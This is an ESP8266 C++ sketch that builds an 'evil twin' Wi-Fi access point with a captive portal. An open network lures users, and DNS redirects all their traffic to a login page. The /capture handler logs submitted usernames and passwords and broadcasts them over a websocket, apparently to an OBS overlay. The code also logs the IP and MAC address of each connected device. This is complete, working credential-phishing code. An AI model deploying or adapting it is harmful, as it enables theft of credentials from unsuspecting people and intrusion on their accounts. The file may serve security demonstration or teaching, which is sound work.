#include <AsyncWebSocket.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>

#include "obs_toast_html.h"
#include "portal_html.h"

extern "C" {
#include "user_interface.h"
}

const char *AP_SSID = "UNGS 100% Real No Fake";
const char *AP_PASS = "";
IPAddress apIP(192, 168, 4, 1);
const byte DNS_PORT = 53;

DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

void setup() {
  Serial.begin(115200);
  Serial.println("\nConfigurando Evil Twin y Portal Cautivo...");

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.print("Access Point \"");
  Serial.print(AP_SSID);
  Serial.println("\" iniciado.");
  Serial.print("IP del AP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("Servidor DNS iniciado.");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_PORTAL);
  });

  server.on("/obs-toast", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_TOAST_OBS);
  });

  server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("user", true) && request->hasParam("pass", true)) {
      String user = request->getParam("user", true)->value();
      String pass = request->getParam("pass", true)->value();

      Serial.print("Credenciales Capturadas: User=");
      Serial.print(user);
      Serial.print(", Pass=");
      Serial.println(pass);

      ws.textAll("{\"user\":\"" + user + "\",\"pass\":\"" + pass + "\"}");

      request->send(200, "text/plain", "Credenciales recibidas!");
    } else {
      request->send(400, "text/plain", "Faltan datos de usuario o contraseña");
    }
  });

  server.onNotFound([](AsyncWebServerRequest *request) {
    if (request->method() == HTTP_GET) {
      if (!request->host().equals(apIP.toString()) && !request->host().equals("192.168.4.1")) {
        request->redirect("http://" + apIP.toString());
        return;
      }
    }
    request->send(404, "text/plain", "Not Found");
  });

  ws.onEvent([](AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    if (type == WS_EVT_CONNECT) {
      Serial.printf("Cliente WebSocket conectado: %u\n", client->id());
    } else if (type == WS_EVT_DISCONNECT) {
      Serial.printf("Cliente WebSocket desconectado: %u\n", client->id());
    } // else if (type == WS_EVT_DATA)
  });
  server.addHandler(&ws);

  server.begin();
  Serial.println("Servidor HTTP iniciado.");
}

void checkConnectedDevices() {
  struct station_info *station_list = wifi_softap_get_station_info();
  Serial.println("Dispositivos conectados:");
  while (station_list != NULL) {
    Serial.print("IP: ");
    Serial.print(IPAddress(station_list->ip).toString());
    Serial.print(" | MAC: ");
    Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
                  station_list->bssid[0], station_list->bssid[1], station_list->bssid[2],
                  station_list->bssid[3], station_list->bssid[4], station_list->bssid[5]);
    station_list = STAILQ_NEXT(station_list, next);
  }
  wifi_softap_free_station_info();
}

unsigned long lastDeviceCheck = 0;
void loop() {
  dnsServer.processNextRequest();

  if (millis() - lastDeviceCheck > 5000) {
    lastDeviceCheck = millis();
    checkConnectedDevices();
  }
}